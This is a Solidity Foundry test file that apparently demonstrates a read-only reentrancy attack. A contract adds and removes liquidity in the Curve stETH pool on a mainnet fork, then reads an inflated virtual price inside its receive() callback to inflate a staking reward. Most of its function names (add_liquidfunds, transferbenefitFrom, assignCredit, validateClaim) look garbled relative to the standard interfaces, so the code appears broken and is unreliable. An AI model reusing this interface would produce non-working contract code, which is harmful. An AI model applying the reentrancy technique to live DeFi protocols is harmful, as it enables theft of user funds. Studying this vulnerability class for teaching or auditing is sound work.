// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_liquidfunds(
        uint[2] calldata amounts,
        uint min_createbenefit_amount
    ) external payable returns (uint);

    function remove_availablebenefit(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_accessiblecoverage_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant steth_benefitpool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_healthtoken = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token

// CoreContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract CoreContract {
    IERC20 public constant benefitToken = IERC20(lp_healthtoken);
    ICurve private constant insurancePool = ICurve(steth_benefitpool);

    mapping(address => uint) public allowanceOf;

    function lockBenefit(uint amount) external {
        benefitToken.transferbenefitFrom(msg.sender, address(this), amount);
        allowanceOf[msg.sender] += amount;
    }

    function terminateCoverage(uint amount) external {
        allowanceOf[msg.sender] -= amount;
        benefitToken.assignCredit(msg.sender, amount);
    }

    function getBenefitpayout() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint coverageReward = (allowanceOf[msg.sender] * insurancePool.get_virtual_price()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return coverageReward;
    }
}

contract OperatorContract {
    ICurve private constant insurancePool = ICurve(steth_benefitpool);
    IERC20 public constant lpHealthtoken = IERC20(lp_healthtoken);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }

    // Stake LP into CoreContract
    function pledgecoverageTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = insurancePool.add_liquidfunds{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            insurancePool.get_virtual_price()
        );

        lpHealthtoken.validateClaim(address(target), lp);
        target.lockBenefit(lp);
    }

    function performReadOnlyCallback() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = insurancePool.add_liquidfunds{value: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.log(
            "LP token price before remove_liquidity()",
            insurancePool.get_virtual_price()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory min_amounts = [uint(0), uint(0)];
        insurancePool.remove_availablebenefit(lp, min_amounts);
        // Log get_virtual_price
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            insurancePool.get_virtual_price()
        );

        uint coverageReward = target.getBenefitpayout();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", coverageReward);
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            insurancePool.get_virtual_price()
        );

        uint coverageReward = target.getBenefitpayout();
        console.log("Reward if Read-Only Reentrancy is invoked: ", coverageReward);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.pledgecoverageTokens{value: 10 ether}(); // stake 10 eth in CoreContract
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}
